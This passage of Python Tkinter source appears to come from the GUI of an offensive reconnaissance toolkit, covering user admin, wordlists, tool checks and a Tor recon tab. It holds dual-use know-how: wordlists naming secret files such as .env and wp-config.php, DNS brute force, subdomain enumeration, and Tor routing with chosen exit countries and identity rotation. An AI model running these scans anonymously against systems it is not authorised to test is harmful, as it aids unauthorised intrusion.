                        str(u.get('created', '')),
                        "✓ Active" if is_active else "✗ Inactive",
                    ),
                    tags=(tag,))
            self._user_count_lbl.config(
                text=(f"Total: {total}   |   "
                      f"Admin: {admins}   |   "
                      f"Member: {total - admins}   |   "
                      f"Active: {active}"))

        refresh_users()

        # ── Buttons ───────────────────────────────────────────────
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')

        def add_user():
            win2 = tk.Toplevel(self.root)
            win2.title("Add New User")
            win2.configure(bg=BG)
            win2.geometry("400x310")
            win2.resizable(False, False)
            tk.Frame(win2, bg=ACCENT, height=2).pack(fill='x')
            tk.Label(win2, text="ADD NEW USER", bg=BG, fg=ACCENT, font=MONO_H).pack(pady=10)
            fvars = {}
            for lbl, key, hide in [
                ("Username:", "un", False),
                ("Password:", "pw", True),
                ("Email:",    "em", False),
            ]:
                row = mk_frame(win2, bg=BG); row.pack(fill='x', padx=22, pady=3)
                tk.Label(row, text=lbl, bg=BG, fg=FG2, font=MONO_S,
                         width=12, anchor='e').pack(side='left')
                var = tk.StringVar(); fvars[key] = var
                ent = mk_entry(row, var=var, w=24)
                if hide: ent.config(show="●")
                ent.pack(side='left', ipady=3, padx=(6,0))

            # Role
            row_r = mk_frame(win2, bg=BG); row_r.pack(fill='x', padx=22, pady=3)
            tk.Label(row_r, text="Role:", bg=BG, fg=FG2, font=MONO_S,
                     width=12, anchor='e').pack(side='left')
            rv = tk.StringVar(value="member"); fvars["role"] = rv
            for rval, rclr in [("admin", ACCENT), ("member", GREEN)]:
                ttk.Radiobutton(
                    row_r, text=rval.upper(), variable=rv, value=rval).pack(side='left', padx=8)

            err_lbl = tk.Label(win2, text="", bg=BG, fg=RED, font=MONO_S)
            err_lbl.pack(pady=4)

            def do_add():
                un = fvars["un"].get().strip()
                pw = fvars["pw"].get().strip()
                em = fvars["em"].get().strip()
                ro = fvars["role"].get()
                if not un or not pw:
                    err_lbl.config(text="Username and password required!")
                    return
                if auth.add_user(un, pw, ro, em):
                    win2.destroy()
                    refresh_users()
                    self.set_status(f"User '{un}' created", GREEN)
                    messagebox.showinfo("Done", f"User '{un}' added!", parent=self.root)
                else:
                    err_lbl.config(text="Username already exists!")

            mk_btn(win2, "✓  Create User", do_add, GREEN).pack(
                pady=10, padx=22, fill='x', ipady=5)

        def toggle_user():
            sel = self._user_tree.selection()
            if not sel: return
            un = str(self._user_tree.item(sel[0])["values"][0])
            if un == self.user["username"]:
                messagebox.showwarning("Warning",
                    "Cannot deactivate yourself!", parent=self.root); return
            new_state = auth.toggle_user(un)
            refresh_users()
            self.set_status(
                f"{un}: {'Active' if new_state else 'Inactive'}",
                GREEN if new_state else YELLOW)

        def change_pwd():
            sel = self._user_tree.selection()
            if not sel: return
            un  = str(self._user_tree.item(sel[0])["values"][0])
            pw  = simpledialog.askstring(
                "Change Password", f"New password for {un}:",
                show="*", parent=self.root)
            if pw:
                auth.change_password(un, pw)
                messagebox.showinfo("Done", "Password changed!", parent=self.root)
                self.set_status(f"Password changed: {un}", GREEN)

        def delete_user():
            sel = self._user_tree.selection()
            if not sel: return
            un = str(self._user_tree.item(sel[0])["values"][0])
            if un == self.user["username"]:
                messagebox.showwarning("Warning",
                    "Cannot delete yourself!", parent=self.root); return
            if messagebox.askyesno("Delete", f"Delete user '{un}'?",
                                   parent=self.root):
                auth.delete_user(un)
                refresh_users()
                self.set_status(f"Deleted: {un}", RED)

        btn_defs = [
            ("+ Add User",           add_user,    GREEN),
            ("⊘ Toggle Active",      toggle_user, YELLOW),
            ("🔑 Change Password",   change_pwd,  CYAN),
            ("🗑 Delete",            delete_user, RED),
            ("🔄 Refresh",           refresh_users, FG3),
        ]
        for txt, cmd, clr in btn_defs:
            mk_btn(bf, txt, cmd, clr, small=True).pack(side='left', padx=4)

    def _settings_audit(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=24, pady=16)
        mk_section(pad, "AUDIT LOG — USER ACTIONS", "📝").pack(fill='x', pady=(0,10))
        log_path = LOGS_DIR/"audit.log"
        txt = mk_stext(pad, h=28, bg=BG3, fg=FG); txt.pack(fill='both', expand=True, pady=(0,8))
        def load_log():
            txt.config(state='normal'); txt.delete('1.0','end')
            if log_path.exists():
                with open(log_path, encoding='utf-8') as f: txt.insert('end', f.read())
            else: txt.insert('end','(No audit entries yet)')
            txt.config(state='disabled')
        load_log()
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        mk_btn(bf, "🔄 Refresh", load_log, CYAN, small=True).pack(side='left', padx=4)
        def export_log():
            if not log_path.exists(): return
            path = filedialog.asksaveasfilename(defaultextension=".log", filetypes=[("Log","*.log"),("All","*.*")])
            if path: shutil.copy(log_path, path); self.set_status(f"Log exported: {path}", GREEN)
        mk_btn(bf, "💾 Export", export_log, GREEN, small=True).pack(side='left', padx=4)

    def _settings_wordlists(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2)
        pad.pack(fill='both', expand=True, padx=16, pady=12)

        mk_section(pad, "WORDLIST MANAGER", "📂").pack(fill='x', pady=(0,8))

        # Info card
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tf_info = mk_frame(info, bg=BG3); tf_info.pack(fill='x', padx=12, pady=8)
        tk.Label(tf_info, text="Built-in: requires SecLists on Kali  |  "
                 "Custom: import any .txt file below",
                 bg=BG3, fg=FG2, font=MONO_S).pack(side='left')
        mk_btn(tf_info, "📥 Install SecLists",
               lambda: webbrowser.open("https://github.com/danielmiessler/SecLists"),
               CYAN, small=True).pack(side='right')

        # ── Search / Filter ───────────────────────────────────────
        sf = mk_frame(pad, bg=BG2); sf.pack(fill='x', pady=(0,8))
        tk.Label(sf, text="Filter:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        wl_filter = tk.StringVar()
        mk_entry(sf, var=wl_filter, w=30).pack(side='left', padx=8, ipady=3)
        wl_type_var = tk.StringVar(value="All")
        ttk.Combobox(sf, textvariable=wl_type_var,
                     values=["All", "builtin", "custom"],
                     width=10, font=MONO_S).pack(side='left', padx=4)

        # ── Treeview ──────────────────────────────────────────────
        cols = ("Name", "Type", "Lines", "Status", "Path")
        wl_tree = mk_tree(pad, columns=cols, show='headings', height=18)
        widths = {"Name":200, "Type":85, "Lines":90, "Status":100, "Path":380}
        for c in cols:
            wl_tree.heading(c, text=c, anchor='w')
            wl_tree.column(c, width=widths.get(c,100), anchor='w', minwidth=50)
        wl_tree.tag_configure('yes',     foreground=GREEN, background=BG3)
        wl_tree.tag_configure('no',      foreground=RED, background=BG3)
        wl_tree.tag_configure('custom',  foreground=CYAN, background=BG3)
        wl_tree.tag_configure('builtin', foreground=ACCENT, background=BG3)
        wl_tree.tag_configure('system',  foreground=YELLOW, background=BG3)

        vsb = ttk.Scrollbar(pad, orient='vertical', command=wl_tree.yview)
        wl_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True, pady=(0,8))
        wl_tree.pack(side='left', fill='both', expand=True, in_=tf)
        vsb.pack(side='right', fill='y', in_=tf)

        # Stats label
        wl_stats_lbl = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S)
        wl_stats_lbl.pack(anchor='w', pady=(0,6))

        def refresh_wl(*_):
            wl_tree.delete(*wl_tree.get_children())
            filt      = wl_filter.get().lower().strip()
            type_filt = wl_type_var.get()
            all_wls   = list_wordlists()
            total_lines = 0
            avail_count = 0
            for name, info in sorted(all_wls.items()):
                if filt and filt not in name.lower(): continue
                if type_filt != "All" and info.get('type','') != type_filt: continue
                exists = info.get('exists', False)
                wtype  = info.get('type', 'builtin')
                if exists:
                    lines_n = info.get('lines') or count_lines(info['path'])
                    total_lines += lines_n
                    avail_count += 1
                    lines_s = f"{lines_n:,}"
                else:
                    lines_s = "—"
                status = "✓  Available" if exists else "✗  Not found"
                tag    = wtype if exists else 'no'  # builtin/system/custom/no
                wl_tree.insert("", "end",
                    values=(name, wtype, lines_s, status, info['path']),
                    tags=(tag,))
            wl_stats_lbl.config(
                text=(f"Showing {wl_tree.get_children().__len__()} wordlists  |  "
                      f"Available: {avail_count}  |  "
                      f"Total lines: {total_lines:,}"),
                fg=GREEN if avail_count else RED)

        refresh_wl()
        wl_filter.trace_add('write', refresh_wl)
        wl_type_var.trace_add('write', refresh_wl)

        # Double-click to open file location
        def on_dbl(event):
            sel = wl_tree.selection()
            if not sel: return
            path = str(wl_tree.item(sel[0])['values'][4])
            import os as _os
            if _os.path.isfile(path):
                open_folder(_os.path.dirname(path))

        wl_tree.bind('<Double-1>', on_dbl)

        # ── Button bar ────────────────────────────────────────────
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')

        def import_wl():
            name = simpledialog.askstring(
                "Import Wordlist", "Name for this wordlist:", parent=self.root)
            if not name: return
            path = filedialog.askopenfilename(
                title="Select wordlist file",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if not path: return
            try:
                with open(path, encoding='utf-8', errors='replace') as f2:
                    wl_content = f2.read()
                out = save_custom_wordlist(name, wl_content)
                refresh_wl()
                self.set_status("Imported '" + name + "' (" + str(wl_content.count('\n')+1) + " lines)", GREEN)
                messagebox.showinfo("Done",
                    "Wordlist '" + name + "' imported!\nPath: " + out,
                    parent=self.root)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)

        def merge_wl():
            paths = filedialog.askopenfilenames(
                title="Select wordlists to merge",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if not paths: return
            name = simpledialog.askstring(
                "Merge Wordlists", "Output name:", parent=self.root)
            if not name: return
            try:
                out = merge_wordlists(list(paths), name)
                refresh_wl()
                self.set_status(f"Merged {len(paths)} lists → {out}", GREEN)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)

        def export_wl():
            sel = wl_tree.selection()
            if not sel:
                messagebox.showwarning("None Selected",
                    "Select a wordlist to export.", parent=self.root); return
            vals = wl_tree.item(sel[0])['values']
            src_path = str(vals[4])
            if not os.path.isfile(src_path):
                messagebox.showwarning("Not Found",
                    f"File not found: {src_path}", parent=self.root); return
            dst = filedialog.asksaveasfilename(
                initialfile=str(vals[0]) + ".txt",
                defaultextension=".txt",
                filetypes=[("Text", "*.txt"), ("All", "*.*")])
            if dst:
                shutil.copy(src_path, dst)
                self.set_status(f"Exported: {dst}", GREEN)

        def delete_wl():
            sel = wl_tree.selection()
            if not sel: return
            vals = wl_tree.item(sel[0])['values']
            name = str(vals[0]); wtype = str(vals[1])
            if wtype != 'custom':
                messagebox.showwarning("Cannot Delete",
                    "Only custom wordlists can be deleted.", parent=self.root); return
            if messagebox.askyesno("Delete",
                    f"Delete wordlist '{name}'?", parent=self.root):
                path = WORDLISTS / (name + ".txt")
                if path.exists():
                    path.unlink()
                    refresh_wl()
                    self.set_status(f"Deleted: {name}", RED)

        def create_sample():
            """Create sample wordlists from built-in mini lists."""
            samples = {
                "common_dirs": [
                    "admin","login","dashboard","api","uploads","files","images",
                    "backup","config",".env",".git","phpinfo.php","wp-admin",
                    "wp-config.php","robots.txt","sitemap.xml","test","dev",
                ],
                "common_subs": [
                    "www","mail","ftp","admin","dev","staging","beta","api",
                    "test","vpn","remote","git","jenkins","grafana","monitor",
                ],
                "common_params": [
                    "id","user","uid","page","q","search","file","path",
                    "url","redirect","token","key","debug","action","type",
                ],
            }
            created = []
            for name, words in samples.items():
                out = save_custom_wordlist(name, '\n'.join(words))
                created.append(name)
            refresh_wl()
            self.set_status(f"Created {len(created)} sample wordlists", GREEN)
            messagebox.showinfo("Done",
                f"Created: {', '.join(created)}", parent=self.root)

        for txt, cmd, clr in [
            ("+ Import",          import_wl,    GREEN),
            ("⊕ Merge",           merge_wl,     CYAN),
            ("💾 Export Selected", export_wl,    ACCENT),
            ("🗑 Delete Custom",   delete_wl,    RED),
            ("✦ Create Samples",  create_sample,YELLOW),
            ("📂 Open Folder",    lambda: open_folder(str(WORDLISTS)), FG2),
            ("🔄 Refresh",        refresh_wl,   FG3),
        ]:
            mk_btn(bf, txt, cmd, clr, small=True).pack(side='left', padx=3)

    def _settings_system(self, frame):
        import platform
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=24, pady=16)
        mk_section(pad, "SYSTEM HEALTH", "🖥").pack(fill='x', pady=(0,12))
        try:
            import psutil
            info = [("OS",platform.system()),("Version",platform.version()[:60]),("Python",platform.python_version()),
                    ("CPU Cores",str(os.cpu_count())),("RAM (GB)",str(round(psutil.virtual_memory().total/1e9,2))),
                    ("RAM Used %",str(psutil.virtual_memory().percent)),
                    ("Disk Free (GB)",str(round(shutil.disk_usage(str(BASE_DIR)).free/1e9,2)))]
        except ImportError:
            info = [("OS",platform.system()),("Python",platform.python_version()),("psutil","Not installed — pip3 install psutil")]
        for k,v in info:
            r = mk_frame(pad, bg=BG2); r.pack(fill='x', pady=3)
            tk.Label(r, text=f"{k}:", bg=BG2, fg=FG3, font=MONO_S, width=16, anchor='e').pack(side='left')
            tk.Label(r, text=v, bg=BG2, fg=FG, font=MONO_S).pack(side='left', padx=12)
        mk_section(pad, "INSTALLED TOOLS", "🔧").pack(fill='x', pady=(16,8))
        tools = ["subfinder","amass","katana","gau","waybackurls","subzy","httpx","nmap","nuclei",
                 "dalfox","sqlmap","ffuf","gobuster","dirsearch","nikto","wafw00f","gowitness",
                 "hakrawler","gospider","arjun","gf","kxss","theHarvester","spyhunt"]
        tg = mk_frame(pad, bg=BG2); tg.pack(fill='x')
        for i, t in enumerate(tools):
            ok = shutil.which(t) is not None
            tk.Label(tg, text=f"{'●' if ok else '○'} {t}", bg=BG2, fg=GREEN if ok else RED,
                     font=(_MONO_FACE,8)).grid(row=i//5, column=i%5, sticky='w', padx=10, pady=3)

    def _settings_bulk(self, frame):
        frame.configure(bg=BG2)
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=24, pady=16)
        mk_section(pad, "IMPORT / EXPORT", "📦").pack(fill='x', pady=(0,12))

        def do_export(label, db_path, key):
            try:
                with open(db_path) as f2: data = json.load(f2)
                items = data.get(key, [])
                out = filedialog.asksaveasfilename(
                    defaultextension='.json',
                    initialfile=label.lower() + '_export.json',
                    filetypes=[('JSON','*.json'), ('All','*.*')])
                if not out: return
                with open(out,'w') as f2: json.dump(items, f2, indent=2)
                self.set_status(f"Exported {len(items)} {label} → {out}", GREEN)
                messagebox.showinfo("Exported",
                    str(len(items)) + " " + label + " exported to:\n" + out,
                    parent=self.root)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)

        def do_import(label, db_path, key, save_fn):
            try:
                inp = filedialog.askopenfilename(
                    title=f"Import {label}",
                    filetypes=[('JSON','*.json'), ('All','*.*')])
                if not inp: return
                with open(inp) as f2: items = json.load(f2)
                if not isinstance(items, list): items = [items]
                for item in items: save_fn(item)
                self.set_status(f"Imported {len(items)} {label}", GREEN)
                messagebox.showinfo("Imported",
                    f"{len(items)} {label} imported!", parent=self.root)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)

        export_items = [
            ("Findings", DB_DIR/"findings.json", "findings", save_finding),
            ("Projects", DB_DIR/"projects.json", "projects", save_project),
        ]
        for label, db_path, key, save_fn in export_items:
            c = mk_card(pad); c.pack(fill='x', pady=6)
            row = mk_frame(c, bg=BG3); row.pack(fill='x', padx=14, pady=12)
            tk.Label(row, text=label, bg=BG3, fg=FG, font=MONO_B, width=14).pack(side='left')
            try:
                with open(db_path) as f2: d2 = json.load(f2)
                count = len(d2.get(key, []))
            except Exception: count = 0
            tk.Label(row, text=f"({count} records)", bg=BG3, fg=FG3, font=MONO_S).pack(side='left', padx=6)
            _l, _p, _k, _fn = label, db_path, key, save_fn
            mk_btn(row, "💾 Export", lambda l=_l,p=_p,k=_k: do_export(l,p,k), CYAN, small=True).pack(side='right', padx=4)
            mk_btn(row, "📂 Import", lambda l=_l,p=_p,k=_k,fn=_fn: do_import(l,p,k,fn), GREEN, small=True).pack(side='right', padx=4)

        # Backup all
        mk_section(pad, "FULL BACKUP", "🗄").pack(fill='x', pady=(16,8))
        def full_backup():
            dst = filedialog.askdirectory(title="Select backup folder")
            if not dst: return
            try:
                import shutil as _sh, time
                ts = str(int(time.time()))
                bk_dir = os.path.join(dst, f"teamcyberops_backup_{ts}")
                _sh.copytree(str(DB_DIR), bk_dir)
                self.set_status("Backup saved: " + bk_dir, GREEN)
                messagebox.showinfo("Backup Done",
                    "Backup saved to:\n" + bk_dir, parent=self.root)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)
        def full_restore():
            src = filedialog.askdirectory(title="Select backup folder")
            if not src: return
            if not messagebox.askyesno("Restore",
                "This will overwrite current data. Continue?", parent=self.root): return
            try:
                import shutil as _sh
                for f2 in os.listdir(src):
                    if f2.endswith('.json'):
                        _sh.copy(os.path.join(src,f2), str(DB_DIR/f2))
                self.set_status("Restore complete", GREEN)
                messagebox.showinfo("Done", "Data restored!", parent=self.root)
            except Exception as e:
                messagebox.showerror("Error", str(e), parent=self.root)
        brow = mk_frame(pad, bg=BG2); brow.pack(fill='x', pady=4)
        mk_btn(brow, "🗄 Backup All Data",    full_backup,  GREEN, small=True).pack(side='left', padx=4)
        mk_btn(brow, "📥 Restore from Backup", full_restore, YELLOW, small=True).pack(side='left', padx=4)

    # ═════════════════════════════════════════════════════════════
    #  TOR RECON TAB — Anonymous Intelligence Gathering
    # ═════════════════════════════════════════════════════════════
    def _build_tor_recon(self, frame):
        frame.configure(bg=BG2)
        from modules.recon import tor_recon
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        t1 = tk.Frame(nb2, bg=BG2); nb2.add(t1, text="  🧅 Tor Status  ")
        t2 = tk.Frame(nb2, bg=BG2); nb2.add(t2, text="  🔒 CT Subdomain Enum  ")
        t3 = tk.Frame(nb2, bg=BG2); nb2.add(t3, text="  🌐 DNS Recon  ")
        t4 = tk.Frame(nb2, bg=BG2); nb2.add(t4, text="  🏢 WHOIS/ASN  ")
        t5 = tk.Frame(nb2, bg=BG2); nb2.add(t5, text="  🔍 HTTP Headers  ")
        t6 = tk.Frame(nb2, bg=BG2); nb2.add(t6, text="  📸 EXIF Metadata  ")
        t7 = tk.Frame(nb2, bg=BG2); nb2.add(t7, text="  📜 JS Analysis  ")
        t8 = tk.Frame(nb2, bg=BG2); nb2.add(t8, text="  ☁ AWS Intel  ")
        t9 = tk.Frame(nb2, bg=BG2); nb2.add(t9, text="  📰 News Intel  ")
        t10= tk.Frame(nb2, bg=BG2); nb2.add(t10,text="  🚀 Full Pipeline  ")
        self._build_tor_status(t1, tor_recon)
        self._build_tor_ct(t2, tor_recon)
        self._build_tor_dns(t3, tor_recon)
        self._build_tor_whois(t4, tor_recon)
        self._build_tor_headers(t5, tor_recon)
        self._build_tor_exif(t6, tor_recon)
        self._build_tor_js(t7, tor_recon)
        self._build_tor_aws(t8, tor_recon)
        self._build_tor_news(t9, tor_recon)
        self._build_tor_pipeline(t10, tor_recon)

    def _tor_shared_target(self, parent):
        """Shared target row + Tor toggle used across Tor tabs."""
        f = mk_frame(parent, bg=BG2); f.pack(fill='x', pady=(0,8))
        tk.Label(f, text="TARGET:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        tvar = tk.StringVar(value=self.project.get() or "")
        mk_entry(f, var=tvar, w=38).pack(side='left', padx=8, ipady=3)
        mk_btn(f, "← Project", lambda: tvar.set(self.project.get()), FG3, small=True).pack(side='left')
        tor_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(f, text="🧅 Via Tor", variable=tor_var).pack(side='right', padx=8)
        return tvar, tor_var

    def _build_tor_status(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "TOR ANONYMITY STATUS", "🧅").pack(fill='x', pady=(0,10))
        info = mk_card(pad); info.pack(fill='x', pady=(0,10))
        tk.Label(info, text=(
            "  All traffic routed via Tor SOCKS5 (127.0.0.1:9050)\n"
            "  Preferred exit nodes: RU / TR / AE / LB / IR\n"
            "  Install Tor: sudo apt install tor && sudo service tor start"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=10)
        self._tor_status_txt = mk_stext(pad, h=18, bg=BG3, fg=GREEN)
        self._tor_status_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def check_tor():
            self._tor_status_txt.config(state='normal')
            self._tor_status_txt.delete('1.0','end')
            self._tor_status_txt.insert('end', "[*] Checking Tor status...\n")
            self._tor_status_txt.config(state='disabled')
            def _go():
                st = tr.tor_status()
                def _upd():
                    self._tor_status_txt.config(state='normal')
                    self._tor_status_txt.delete('1.0','end')
                    run = st.get('tor_running', False)
                    self._tor_status_txt.insert('end', f"Tor Running:     {'✅ YES' if run else '❌ NO'}\n")
                    self._tor_status_txt.insert('end', f"Proxy:           {st.get('proxy','')}\n")
                    self._tor_status_txt.insert('end', f"Exit IP:         {st.get('exit_ip','unknown')}\n")
                    self._tor_status_txt.insert('end', f"Exit Country:    {st.get('exit_country','unknown')}\n")
                    self._tor_status_txt.insert('end', f"Preferred Exits: {', '.join(st.get('preferred_exits',[]))}\n\n")
                    if not run:
                        self._tor_status_txt.insert('end', "To start Tor:\n")
                        self._tor_status_txt.insert('end', "  sudo apt install tor\n")
                        self._tor_status_txt.insert('end', "  sudo service tor start\n")
                        self._tor_status_txt.insert('end', "  # Or: sudo systemctl start tor\n")
                    self._tor_status_txt.config(state='disabled')
                    self.set_status(f"Tor: {'RUNNING' if run else 'NOT RUNNING'}", GREEN if run else RED)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        def rotate():
            self._tor_status_txt.config(state='normal')
            self._tor_status_txt.insert('end', "[*] Rotating Tor identity...\n")
            self._tor_status_txt.config(state='disabled')
            def _go():
                ok = tr.rotate_tor_identity()
                if ok:
                    new_ip = tr.get_tor_ip()
                    self.root.after(0, lambda: self._tor_status_txt.config(state='normal') or
                                    self._tor_status_txt.insert('end', f"[✓] New identity! Exit IP: {new_ip}\n") or
                                    self._tor_status_txt.config(state='disabled'))
                else:
                    self.root.after(0, lambda: self._tor_status_txt.config(state='normal') or
                                    self._tor_status_txt.insert('end', "[!] Rotation failed — is Tor control port (9051) open?\n") or
                                    self._tor_status_txt.config(state='disabled'))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "🔍 Check Tor Status", check_tor, GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🔄 Rotate Identity", rotate, CYAN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "🌐 Check IP Direct", lambda: threading.Thread(
            target=lambda: self.set_status(f"Direct IP: {tr.get_tor_ip()}", CYAN), daemon=True).start(),
               FG2, small=True).pack(side='left', padx=4)

    def _build_tor_ct(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "CERTIFICATE TRANSPARENCY — SUBDOMAIN ENUMERATION", "🔒").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Sources: crt.sh  •  CertSpotter  •  HackerTarget\n"
            "  Finds all subdomains from SSL certificate logs — passive, no target touch"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, tor_var = self._tor_shared_target(pad)
        self._ct_results_txt = mk_stext(pad, h=22, bg=BG3, fg=GREEN)
        self._ct_results_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_ct():
            domain = tvar.get().strip()
            if not domain: return
            use_tor = tor_var.get()
            self._ct_results_txt.config(state='normal')
            self._ct_results_txt.delete('1.0','end')
            self._ct_results_txt.insert('end', f"[*] CT Subdomain Enum for: {domain}\n")
            self._ct_results_txt.insert('end', f"[*] Via Tor: {use_tor}\n\n")
            self._ct_results_txt.config(state='disabled')
            def _go():
                r1 = tr.ct_crtsh(domain, use_tor)
                r2 = tr.ct_hackertarget(domain, use_tor)
                r3 = tr.ct_certspotter(domain, use_tor)
                merged = tr.merge_ct_results(r1, r2, r3)
                def _upd():
                    self._ct_results_txt.config(state='normal')
                    self._ct_results_txt.insert('end', f"=== crt.sh: {r1.get('count',0)} subdomains ===\n")
                    if r1.get('error'): self._ct_results_txt.insert('end', f"  Error: {r1['error']}\n")
                    self._ct_results_txt.insert('end', f"=== CertSpotter: {r3.get('count',0)} subdomains ===\n")
                    if r3.get('error'): self._ct_results_txt.insert('end', f"  Error: {r3['error']}\n")
                    self._ct_results_txt.insert('end', f"=== HackerTarget: {r2.get('count',0)} subdomains ===\n")
                    if r2.get('error'): self._ct_results_txt.insert('end', f"  Error: {r2['error']}\n")
                    self._ct_results_txt.insert('end', f"\n=== TOTAL UNIQUE: {merged['count']} ===\n\n")
                    for sub in merged.get('all_unique', []):
                        sources = merged.get('source_map', {}).get(sub, [])
                        self._ct_results_txt.insert('end', f"  {sub}  [{', '.join(sources)}]\n")
                    self._ct_results_txt.config(state='disabled')
                    # Save to logs
                    out = LOGS_DIR / f"{domain}_ct_subdomains.txt"
                    with open(out, 'w') as f2: f2.write('\n'.join(merged.get('all_unique',[])))
                    self.set_status(f"CT Enum: {merged['count']} subdomains → {out.name}", GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Run CT Enum", run_ct, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy All", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._ct_results_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._ct_results_txt.get('1.0','end')), FG2, small=True).pack(side='left', padx=4)

    def _build_tor_dns(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "FULL DNS RECONNAISSANCE", "🌐").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Records: A, AAAA, MX, TXT, NS, CNAME, SOA, SRV, CAA\n"
            "  Checks: SPF, DMARC (p=none = email spoofing!), DKIM, Zone Transfer, Internal IPs"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tvar, _ = self._tor_shared_target(pad)
        # DNS brute force wordlist
        wl_f = mk_frame(pad, bg=BG2); wl_f.pack(fill='x', pady=(0,8))
        self._dns_brute_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(wl_f, text="Enable DNS Brute Force", variable=self._dns_brute_var).pack(side='left')
        self._dns_txt = mk_stext(pad, h=22, bg=BG3, fg=FG)
        self._dns_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_dns():
            domain = tvar.get().strip()
            if not domain: return
            self._dns_txt.config(state='normal'); self._dns_txt.delete('1.0','end')
            self._dns_txt.insert('end', f"[*] DNS Recon for: {domain}\n\n")
            self._dns_txt.config(state='disabled')
            def _go():
                r = tr.dns_full_recon(domain)
                lines = []
                lines.append(f"=== DNS RECORDS for {domain} ===\n")
                for rtype, vals in r.get('records', {}).items():
                    lines.append(f"\n{rtype}:")
                    for v in vals: lines.append(f"  {v}")
                lines.append(f"\n=== SECURITY EMAIL ===")
                lines.append(f"SPF:   {r.get('spf','NOT SET')}")
                lines.append(f"DMARC: {r.get('dmarc','NOT SET')}")
                if r.get('dkim'): lines.append(f"DKIM:  {len(r['dkim'])} selectors found")
                lines.append(f"\n=== ZONE TRANSFER: {'⚠ POSSIBLE!' if r.get('zone_transfer_possible') else 'Not vulnerable'} ===")
                lines.append(f"\n=== INTERESTING FINDINGS ({len(r.get('interesting',[]))}) ===")
                for i in r.get('interesting',[]): lines.append(f"  {i}")
                if self._dns_brute_var.get():
                    lines.append(f"\n=== DNS BRUTE FORCE ===")
                    br = tr.dns_brute_force(domain)
                    lines.append(f"Found: {br.get('count',0)} subdomains")
                    for item in br.get('found',[]):
                        lines.append(f"  {item['subdomain']}  →  {', '.join(item['ips'])}")
                content = '\n'.join(lines)
                def _upd():
                    self._dns_txt.config(state='normal')
                    self._dns_txt.delete('1.0','end')
                    self._dns_txt.insert('end', content)
                    self._dns_txt.config(state='disabled')
                    self.set_status(f"DNS Recon: {len(r.get('records',{}))} record types, {len(r.get('interesting',[]))} findings", GREEN)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "▶ Run DNS Recon", run_dns, GREEN).pack(side='left', padx=4, ipady=4)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._dns_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _build_tor_whois(self, frame, tr):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "WHOIS / ASN MAPPING", "🏢").pack(fill='x', pady=(0,8))
        tvar, _ = self._tor_shared_target(pad)
        self._whois_txt = mk_stext(pad, h=26, bg=BG3, fg=FG)
        self._whois_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_whois():
            domain = tvar.get().strip()
            if not domain: return
            self._whois_txt.config(state='normal'); self._whois_txt.delete('1.0','end')
            self._whois_txt.insert('end', f"[*] WHOIS + ASN for: {domain}\n\n")
            self._whois_txt.config(state='disabled')
            def _go():
                w = tr.whois_lookup(domain)
                a = tr.asn_full_recon(domain)
